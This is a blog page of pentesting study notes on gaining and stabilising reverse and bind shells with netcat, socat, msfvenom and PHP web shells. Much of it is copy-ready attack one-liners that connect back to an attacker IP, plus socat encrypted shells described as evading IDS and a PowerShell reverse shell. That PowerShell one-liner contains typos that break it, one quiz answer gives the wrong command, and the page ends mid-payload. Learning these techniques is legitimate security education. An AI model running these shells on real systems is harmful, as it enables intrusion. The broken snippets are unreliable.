<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>What the shell?? :: Dayyala Ravi</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="What the shell?? There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.
Netcat - A tradional swiss army knife of Networking.
Socat is like netcat on steroids. It can do all same things, and many more. Socat shells are usually more stable than netcat shells out of the box." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/resources/jr-pentester/what-the-shell/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/custom.min.326411e5dc338f1afa0110f16fe2e2f9a33f29f07d6067be424d05c9d4cb6841.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="What the shell??">
<meta property="og:description" content="What the shell?? There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.
Netcat - A tradional swiss army knife of Networking.
Socat is like netcat on steroids. It can do all same things, and many more. Socat shells are usually more stable than netcat shells out of the box." />
<meta property="og:url" content="//localhost:1313/resources/jr-pentester/what-the-shell/" />
<meta property="og:site_name" content="Dayyala Ravi" />

  <meta property="og:image" content="//localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2024-01-20 00:00:00 &#43;0000 UTC" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Dayyala Ravi
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/posts">Blogs</a></li>
        
      
        
          <li><a href="/">Home</a></li>
        
      
        
          <li><a href="/resources">Resources</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Blogs</a></li>
        
      
        
          <li><a href="/" >Home</a></li>
        
      
        
          <li><a href="/resources" >Resources</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/resources/jr-pentester/what-the-shell/">What the shell??</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-01-20</time></div>

  
  


  

  <div class="post-content"><div>
        <h1 id="what-the-shell">What the shell??<a href="#what-the-shell" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<ul>
<li>
<p>There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.</p>
</li>
<li>
<p><code>Netcat</code> - A tradional swiss army knife of Networking.</p>
</li>
<li>
<p><code>Socat</code> is like netcat on steroids. It can do all same things, and many more. Socat shells are usually more stable than netcat shells out of the box.</p>
</li>
<li>
<p><code>Metasploit - multi/handler</code> - this module is like a socat, and netcat - used to receive the reverse shells.</p>
</li>
<li>
<p>One of the most prominent of these is <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Payloads All The Things</a>. The <a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse Shell Cheatsheet</a> is also commonly used.</p>
</li>
<li></li>
</ul>
<h2 id="types-of-shells">Types of Shells<a href="#types-of-shells" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li><code>Reverse shells</code> are when the target is forced to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. Please see the example of reverse shell below using netcat
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nc -lvnp <span style="color:#ae81ff">443</span> <span style="color:#75715e"># On the attacking machine:</span>
</span></span><span style="display:flex;"><span>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash  <span style="color:#75715e"># On the target:</span>
</span></span></code></pre></div></li>
<li><code>Bind shells</code> are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target. Please see the example of bind shell using the netcat.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp &lt;port&gt; -e <span style="color:#e6db74">&#34;cmd.exe&#34;</span> <span style="color:#75715e">#On the target:</span>
</span></span><span style="display:flex;"><span>nc MACHINE_IP &lt;port&gt; <span style="color:#75715e">#On the attacking machine:</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="netcat-shell-stabilisation">Netcat Shell Stabilisation<a href="#netcat-shell-stabilisation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>Ok, so we&rsquo;ve caught or connected to a netcat shell, what next?</li>
<li>Netcat shells are very unstable by default.They are non-interactive, and often have strange formatting errors. This is due to netcat &ldquo;shells&rdquo; really being processes running inside a terminal, rather than being bonafide terminals in their own right.</li>
<li>Fortunately, there are many ways to stabilise netcat shells on Linux systems</li>
</ul>
<h4 id="technique-1-python">Technique 1: Python<a href="#technique-1-python" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>The first thing to do is use <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won&rsquo;t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.</li>
<li>Step two is: <code>export TERM=xterm</code> - this will give us access to term commands such as <code>clear</code>.</li>
<li>Finally (and most importantly) we will background the shell using <code>Ctrl + Z</code>. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.</li>
</ul>
<h4 id="technique-2-rlwrap">Technique 2: rlwrap<a href="#technique-2-rlwrap" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <code>sudo apt install rlwrap</code>.</li>
<li>To use rlwrap, we invoke a slightly different listener: <code>rlwrap nc -lvnp &lt;port&gt;</code></li>
<li>Background the shell with Ctrl + Z, then use <code>stty raw -echo; fg</code> to stabilise and re-enter the shell.</li>
</ul>
<h4 id="technique-3-socat-not-installed-on-target">Technique 3: Socat (Not installed on target)<a href="#technique-3-socat-not-installed-on-target" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<code>sudo python3 -m http.server 80</code>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>).</li>
<li>For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>).</li>
</ul>
<h4 id="terminal-resize">Terminal resize<a href="#terminal-resize" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<ul>
<li>It&rsquo;s useful to be able to change your terminal tty size, It must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.</li>
<li>First, open another terminal and run <code>stty -a</code>. This will give you a large stream of output about the current shell. Next, in your reverse/bind shell, type in: <code>stty rows &lt;number&gt;</code> and <code>stty cols &lt;number&gt;</code> to get terminal resized.</li>
</ul>
<h2 id="socat">Socat<a href="#socat" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>The easiest way to think about socat is as a connector between two points.</li>
</ul>
<h4 id="reverse-shells">Reverse shells<a href="#reverse-shells" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Reverse shell listener (similar to nc -lvnp &lt;port&gt;), Attacker.</span>
</span></span><span style="display:flex;"><span>socat TCP-L:&lt;port&gt; -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Windows (on Target): pipes option used to force powershell to use unix style standard intput and output</span>
</span></span><span style="display:flex;"><span>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Linux (target)</span>
</span></span><span style="display:flex;"><span>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:<span style="color:#e6db74">&#34;bash -li&#34;</span>
</span></span></code></pre></div><h4 id="bind-shells">Bind shells<a href="#bind-shells" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#On linux target, we use</span>
</span></span><span style="display:flex;"><span>socat TCP-L:&lt;port&gt; EXEC:<span style="color:#e6db74">&#34;bash -li&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#On windows target</span>
</span></span><span style="display:flex;"><span>socat TCP-L:&lt;port&gt; EXEC:powershell.exe,pipes
</span></span><span style="display:flex;"><span><span style="color:#75715e">#And for attacking, regardless of machine</span>
</span></span><span style="display:flex;"><span>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -
</span></span></code></pre></div><ul>
<li>Now let&rsquo;s take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell listner. This will only work when the target is Linux, but is significantly more stable. <code>socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</code></li>
<li>The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default; however, it&rsquo;s possible to upload a precompiled socat binary, which can then be executed as normal. You can download a precompiled socat binary from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">this link</a>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#The special command is as follows:</span>
</span></span><span style="display:flex;"><span>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:<span style="color:#e6db74">&#34;bash -li&#34;</span>,pty,stderr,sigint,setsid,sane
</span></span><span style="display:flex;"><span><span style="color:#75715e">#This is a handful, so let&#39;s break it down.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#The first part is easy -- we&#39;re linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:&#34;bash -li&#34;. We&#39;re also passing the arguments: pty, stderr, sigint, setsid and sane:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pty, allocates a pseudoterminal on the target -- part of the stabilisation process</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#setsid, creates the process in a new session</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#sane, stabilises the terminal, attempting to &#34;normalise&#34; it.</span>
</span></span></code></pre></div><h2 id="socat-encrypted-shells">Socat Encrypted Shells<a href="#socat-encrypted-shells" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>One of the many great things about socat is that it&rsquo;s capable of creating encrypted shells &ndash; both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.</li>
<li>Suffice to say that any time <code>TCP</code> was used as part of a command, this should be replaced with <code>OPENSSL</code> when working with encrypted shells.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine: </span>
</span></span><span style="display:flex;"><span>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days <span style="color:#ae81ff">362</span> -out shell.crt
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># When you run this command it will ask you to fill in information about the certificate. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This can be left blank, or filled randomly.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We then need to merge the two created files into a single .pem file:</span>
</span></span><span style="display:flex;"><span>cat shell.key shell.crt &gt; shell.pem
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now, when we set up our reverse shell listener, we use:</span>
</span></span><span style="display:flex;"><span>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert<span style="color:#f92672">=</span>shell.pem,verify<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> -
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This sets up an OPENSSL listener using our generated certificate. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Please note that the certificate must be used on whichever device is listening.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># To connect back, we would use:</span>
</span></span><span style="display:flex;"><span>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> EXEC:/bin/bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The same technique would apply for a bind shell:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target:</span>
</span></span><span style="display:flex;"><span>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert<span style="color:#f92672">=</span>shell.pem,verify<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> EXEC:cmd.exe,pipes
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attacker:</span>
</span></span><span style="display:flex;"><span>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> -
</span></span></code></pre></div><ul>
<li>What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called &ldquo;encrypt.pem&rdquo; ? <code>socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></li>
<li>If your IP is 10.10.10.5, what syntax would you use to connect back to this listener? <code>socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></li>
</ul>
<h2 id="common-shell-payloads">Common Shell payloads<a href="#common-shell-payloads" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>
<p>Its not always lucky that we get shell directly using <code>-e</code> in the netcat as <code>nc -lvnp &lt;port&gt; -e /bin/bash</code>. Few version of netcat will not allow it, particulary linux. But there might be higher possibility that this feature is supported.</p>
</li>
<li>
<p>So, In linux, we use pipes to to the shell</p>
</li>
<li>
<p>bind shell, listener on target <code>mkfifo /tmp/f; nc -lvnp &lt;port&gt; &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm -rf /tmp/f</code> and to get shell on the attacker side, <code>nc &lt;target_ip&gt; &lt;port&gt;</code>.</p>
</li>
<li>
<p>Similarly, reverse shell. listener on the attacker side <code>nc -lvnp &lt;port&gt;</code> and the target side, <code>mkfifo /tmp/f; nc &lt;atacker_ip&gt; &lt;port&gt; &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm -rf /tmp/f</code></p>
</li>
<li>
<p>When targeting a modern <code>Windows Server</code>, it is very common to require a Powershell reverse shell, so we&rsquo;ll be covering the standard one-liner PSH reverse shell here. To use this below coomand, we have to replace the <code>&lt;ip&gt;</code> and <code>&lt;port&gt;</code> with ip and port of attcker.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;</span>$client<span style="color:#e6db74"> = New-Object System.Net.Sockets.TCPClients(&#39;&lt;ip&gt;&#39;, &lt;port&gt;); </span>$stream<span style="color:#e6db74"> = </span>$cient<span style="color:#e6db74">.GetStream(); [byte[]]</span>$bytes<span style="color:#e6db74"> = 0..65535|%{0}; while((</span>$i<span style="color:#e6db74"> = </span>$stream<span style="color:#e6db74">.Read(</span>$bytes<span style="color:#e6db74">.Length))) -ne 0){;</span>$data<span style="color:#e6db74"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span>$bytes<span style="color:#e6db74">,0,</span>$i<span style="color:#e6db74">); </span>$sendback<span style="color:#e6db74"> = (iex </span>$data<span style="color:#e6db74"> 2&gt;&amp;1 | Out-String); </span>$sendback2<span style="color:#e6db74"> = </span>$sendback<span style="color:#e6db74"> + &#39;PS&#39; + (pwd).Patch + &#39;&gt; &#39;; </span>$sendbyte<span style="color:#e6db74"> = ([text.encoding]::ASCII).GetBytes(</span>$sendback2<span style="color:#e6db74">);</span>$stream<span style="color:#e6db74">.Write(</span>$sendbyte<span style="color:#e6db74">,0,</span>$sendbyte<span style="color:#e6db74">.Length);</span>$stream<span style="color:#e6db74">.Flush()};</span>$client<span style="color:#e6db74">.Close()&#34;</span>
</span></span></code></pre></div><h2 id="msvenom">MSVENOM<a href="#msvenom" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>Msfvenom: the one-stop-shop for all things payload related.</li>
<li>It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).</li>
<li>The standard syntax for msfvenom is as follows: <code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></li>
<li>For example: <code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code>, where -f <format> - Specifies the output format, -o <file> - The output location and filename for the generated payload.</li>
<li>Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.</li>
<li><code>Staged payloads</code> are sent in two parts. The <code>first part</code> is called the <code>stager</code>. This is a piece of code which is <code>executed directly on the server itself</code>. It connects back to a waiting listener, but <code>doesn't actually contain any reverse shell code</code> by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts &ndash; a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener &ndash; usually the Metasploit multi/handler, which will be covered in the next task.</li>
<li><code>Stageless payloads</code> are more common &ndash; these are what we&rsquo;ve been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener. Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.</li>
<li><code>Payload Naming Conventions</code>: When working with msfvenom, it&rsquo;s important to understand how the naming system works. The basic convention is as follows: <code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code>. For example: <code>linux/x86/shell_reverse_tcp</code>.</li>
<li><code>Listing all available payloads</code>, which can then be piped into grep to search for a specific set of payloads. For example. <code>msfvenom --list payloads | grep windows/x64/meterpreter/</code></li>
</ul>
<h2 id="web-shells">WEB SHELLS<a href="#web-shells" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>&ldquo;Webshell&rdquo; is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.</li>
<li>Essentially, commands are entered into a webpage &ndash; either through a HTML form, or directly as arguments in the URL &ndash; which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</li>
<li>As PHP is still the most common server side scripting language, let&rsquo;s have a look at some simple code for this. In a very basic one line format: <code>&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;; ?&gt;</code></li>
<li>This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system &ndash; be it Windows or Linux.</li>
<li>As mentioned previously, there are a variety of webshells available on Kali by default at /usr/share/webshells &ndash; including the infamous PentestMonkey php-reverse-shell &ndash; a full reverse shell written in PHP.</li>
<li>When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>-c<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">%</span>24client<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span>20New-Object<span style="color:#66d9ef">%</span>20System.Net.Sockets.TCPClient<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span>&lt;IP&gt;<span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">%</span>2C&lt;PORT&gt;<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24stream<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24client.GetStream<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>5Bbyte<span style="color:#66d9ef">%</span>5B<span style="color:#66d9ef">%</span><span style="color:#ae81ff">5D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">5D</span><span style="color:#66d9ef">%</span>24bytes<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">200</span>.<span style="color:#ae81ff">.65535</span><span style="color:#66d9ef">%</span>7C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">25</span><span style="color:#66d9ef">%</span>7B0<span style="color:#66d9ef">%</span><span style="color:#ae81ff">7D</span><span style="color:#66d9ef">%</span>3Bwhile<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>24i<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24stream.Read<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>24bytes<span style="color:#66d9ef">%</span>2C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">200</span><span style="color:#66d9ef">%</span>2C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24bytes.Length<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">-ne</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">200</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>7B<span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24data<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>28New-Object<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>-TypeName<span style="color:#66d9ef">%</span>20System.Text.ASCIIEncoding<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span>.GetString<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>24bytes<span style="color:#66d9ef">%</span>2C0<span style="color:#66d9ef">%</span>2C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24i<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24sendback<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>28iex<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24data<span style="color:#66d9ef">%</span><span style="color:#ae81ff">202</span><span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">261</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>7C<span style="color:#66d9ef">%</span>20Out-String<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span 